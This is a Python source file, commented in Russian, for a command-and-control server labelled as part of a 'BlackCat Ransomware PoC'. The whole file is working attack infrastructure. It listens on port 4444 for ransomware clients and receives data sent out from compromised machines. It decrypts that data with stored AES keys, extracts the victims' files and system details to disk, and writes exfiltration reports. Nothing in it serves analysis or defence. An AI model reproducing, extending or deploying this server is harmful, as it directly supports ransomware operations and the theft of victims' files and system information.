# save as: blackcat_c2_server.py на Kali Linux
#!/usr/bin/env python3
import socket
import threading
import struct
import os
import json
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64

class BlackCatC2Server:
    def __init__(self, host='0.0.0.0', port=4444, data_dir='exfiltrated_data'):
        self.host = host
        self.port = port
        self.data_dir = data_dir
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Создаем директорию для данных
        os.makedirs(data_dir, exist_ok=True)
        
    def start(self):
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] BlackCat C2 Server listening on {self.host}:{self.port}")
        print(f"[*] Data will be saved to: {os.path.abspath(self.data_dir)}")
        
        while True:
            client_socket, addr = self.server.accept()
            print(f"\n[+] New connection from {addr[0]}:{addr[1]}")
            
            client_thread = threading.Thread(
                target=self.handle_blackcat_client,
                args=(client_socket, addr)
            )
            client_thread.start()
    
    def handle_blackcat_client(self, client_socket, addr):
        try:
            client_socket.settimeout(30)
            
            # Ждем сигнатуру BlackCat
            signature = client_socket.recv(19)  # "BLACKCAT_EXFIL_v1.0"
            if not signature.startswith(b'BLACKCAT_EXFIL'):
                print(f"[-] Invalid signature from {addr[0]}: {signature}")
                return
            
            # Получаем размер данных
            size_data = client_socket.recv(4)
            if len(size_data) < 4:
                print(f"[-] Invalid data size from {addr[0]}")
                return
            
            data_size = struct.unpack('>I', size_data)[0]
            print(f"[*] Receiving {data_size} bytes from {addr[0]}")
            
            # Получаем данные
            received_data = b''
            bytes_received = 0
            while bytes_received < data_size:
                try:
                    chunk = client_socket.recv(min(8192, data_size - bytes_received))
                    if not chunk:
                        break
                    received_data += chunk
                    bytes_received += len(chunk)
                    
                    # Прогресс
                    if bytes_received % (1024*1024) == 0:  # Каждые 1MB
                        print(f"[*] Received {bytes_received}/{data_size} bytes...")
                        
                except socket.timeout:
                    print(f"[-] Timeout receiving data from {addr[0]}")
                    break
            
            if received_data:
                self.save_exfiltrated_data(addr[0], received_data)
            else:
                print(f"[-] No data received from {addr[0]}")
                
        except Exception as e:
            print(f"[-] Error handling client {addr[0]}: {e}")
        finally:
            client_socket.close()
    
    def save_exfiltrated_data(self, client_ip, encrypted_data):
        """Сохраняем эксфильтрированные данные"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Сохраняем зашифрованные данные
        encrypted_filename = f"{self.data_dir}/encrypted_{client_ip}_{timestamp}.bin"
        with open(encrypted_filename, 'wb') as f:
            f.write(encrypted_data)
        
        print(f"[+] Saved encrypted data to: {encrypted_filename}")
        
        # Пытаемся расшифровать (если известен ключ)
        self.try_decrypt_data(encrypted_filename, encrypted_data, client_ip, timestamp)
    
    def try_decrypt_data(self, encrypted_filename, encrypted_data, client_ip, timestamp):
        """Пытаемся расшифровать данные"""
        try:
            # Для демонстрации - если есть ключ в файле keys.json
            keys_file = "keys.json"
            if os.path.exists(keys_file):
                with open(keys_file, 'r') as f:
                    keys = json.load(f)
                
                for key_name, key_hex in keys.items():
                    try:
                        key = bytes.fromhex(key_hex)
                        if len(key) == 32:  # AES-256 ключ
                            # Пытаемся расшифровать
                            # В реальном BlackCat данные имеют формат: nonce(12) + ciphertext
                            if len(encrypted_data) > 12:
                                nonce = encrypted_data[:12]
                                ciphertext = encrypted_data[12:]
                                
                                aesgcm = AESGCM(key)
                                decrypted = aesgcm.decrypt(nonce, ciphertext, None)
                                
                                # Сохраняем расшифрованные данные
                                decrypted_filename = f"{self.data_dir}/decrypted_{client_ip}_{timestamp}_{key_name}.bin"
                                with open(decrypted_filename, 'wb') as f:
                                    f.write(decrypted)
                                
                                print(f"[!] Successfully decrypted with key '{key_name}'")
                                print(f"[+] Saved decrypted data to: {decrypted_filename}")
                                
                                # Анализируем расшифрованные данные
                                self.analyze_decrypted_data(decrypted, client_ip, timestamp, key_name)
                                break
                                
                    except Exception as e:
                        continue
            
            print("[*] No valid decryption key found. Data remains encrypted.")
            
        except Exception as e:
            print(f"[-] Decryption error: {e}")
    
    def analyze_decrypted_data(self, data, client_ip, timestamp, key_name):
        """Анализируем расшифрованные данные"""
        try:
            if data.startswith(b'BLACKCAT_EXFIL_v1.0'):
                print("[*] Analyzing BlackCat exfiltration data...")
                
                offset = 19  # Длина сигнатуры
                
                # Читаем длину системной информации
                info_len = struct.unpack('>I', data[offset:offset+4])[0]
                offset += 4
                
                # Читаем системную информацию
                system_info = data[offset:offset+info_len].decode('utf-8', errors='ignore')
                offset += info_len
                
                print(f"[*] System Info: {system_info}")
                
                # Читаем количество файлов
                file_count = struct.unpack('>I', data[offset:offset+4])[0]
                offset += 4
                
                print(f"[*] Found {file_count} exfiltrated files")
                
                # Создаем директорию для файлов
                files_dir = f"{self.data_dir}/files_{client_ip}_{timestamp}"
                os.makedirs(files_dir, exist_ok=True)
                
                # Извлекаем файлы
                for i in range(file_count):
                    # Длина пути
                    path_len = struct.unpack('>I', data[offset:offset+4])[0]
                    offset += 4
                    
                    # Путь
                    file_path = data[offset:offset+path_len].decode('utf-8', errors='ignore')
                    offset += path_len
                    
                    # Размер файла
                    file_size = struct.unpack('>Q', data[offset:offset+8])[0]
                    offset += 8
                    
                    # Данные файла
                    file_data = data[offset:offset+file_size]
                    offset += file_size
                    
                    # Пропускаем разделитель
                    offset += len(b"---FILE_END---")
                    
                    # Сохраняем файл
                    safe_filename = os.path.basename(file_path).replace('..', '_').replace('/', '_').replace('\\', '_')
                    save_path = f"{files_dir}/{i:03d}_{safe_filename}"
                    
                    with open(save_path, 'wb') as f:
                        f.write(file_data)
                    
                    print(f"  [-] Saved: {safe_filename} ({len(file_data)} bytes)")
                    
                    # Если это текстовый файл, показываем содержимое
                    if safe_filename.endswith(('.txt', '.ini', '.config', '.sql')):
                        try:
                            text_content = file_data.decode('utf-8', errors='ignore')
                            if len(text_content) < 1000:  # Показываем только небольшие файлы
                                print(f"      Content preview: {text_content[:200]}...")
                        except:
                            pass
                
                print(f"[+] All files saved to: {files_dir}")
                
                # Создаем отчет
                self.create_exfiltration_report(files_dir, system_info, file_count, client_ip, timestamp)
                
        except Exception as e:
            print(f"[-] Error analyzing data: {e}")
    
    def create_exfiltration_report(self, files_dir, system_info, file_count, client_ip, timestamp):
        """Создаем отчет об эксфильтрации"""
        report = {
            "timestamp": timestamp,
            "client_ip": client_ip,
            "system_info": system_info,
            "file_count": file_count,
            "files_directory": files_dir,
            "analysis_date": datetime.now().isoformat()
        }
        
        report_file = f"{files_dir}/exfiltration_report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved to: {report_file}")

def main():
    print("""
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗╚══██╔══╝
    ██████╔╝██║     ███████║██║     █████╔╝ ██║     ███████║   ██║   
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║     ██╔══██║   ██║   
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╗██║  ██║   ██║   
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   
    
    C2 Server for BlackCat Ransomware PoC
    """)
    
    server = BlackCatC2Server('0.0.0.0', 4444, 'blackcat_exfiltrated')
    server.start()

if __name__ == "__main__":
    main()